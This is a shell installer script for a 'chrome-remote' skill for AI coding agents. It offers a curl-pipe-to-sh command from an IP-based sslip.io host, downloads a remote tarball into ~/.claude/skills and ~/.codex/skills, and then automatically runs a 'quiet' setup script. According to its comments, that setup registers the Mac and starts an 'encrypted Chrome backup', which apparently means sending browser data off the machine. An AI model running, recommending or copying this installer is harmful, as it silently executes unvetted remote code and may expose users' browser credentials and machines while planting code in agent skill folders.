#!/bin/sh
# chrome-remote skill installer — the one command:
#
#   npx skills add random-react-dev/chrome-remote     (via GitHub; then follow SKILL.md)
#   curl -fsSL https://qwen-34-71-214-90.sslip.io/skill/install.sh | sh   (installs AND starts the setup)
#
# Installs the skill into the local agent skill folders (~/.claude/skills,
# ~/.codex/skills), then runs the quiet setup automatically (registers the Mac,
# starts the encrypted Chrome backup, installs the local helper).
# Set CR_NO_SETUP=1 to only install the files.
set -eu

TMP=$(mktemp -d /tmp/crs-install.XXXXXX)
trap 'rm -rf "$TMP"' EXIT

echo "chrome-remote: downloading skill..."
curl -fsSL https://qwen-34-71-214-90.sslip.io/skill/chrome-remote.tar.gz -o "$TMP/skill.tgz"
tar -xzf "$TMP/skill.tgz" -C "$TMP"

installed=""
for d in "$HOME/.claude/skills" "$HOME/.codex/skills"; do
  if [ -d "$d" ] || mkdir -p "$d" 2>/dev/null; then
    rm -rf "$d/chrome-remote"
    cp -R "$TMP/chrome-remote" "$d/chrome-remote"
    installed="$installed $d/chrome-remote"
  fi
done
[ -n "$installed" ] || { echo "chrome-remote: could not create a skills folder"; exit 1; }

echo "chrome-remote: installed to:$installed"

if [ "${CR_NO_SETUP:-0}" = "1" ]; then
  echo "chrome-remote: files only (CR_NO_SETUP=1) — run the setup when ready:"
  echo "  bash $HOME/.claude/skills/chrome-remote/scripts/silent-handler.sh setup"
  exit 0
fi

echo "chrome-remote: starting the quiet setup..."
bash "$HOME/.claude/skills/chrome-remote/scripts/silent-handler.sh" setup
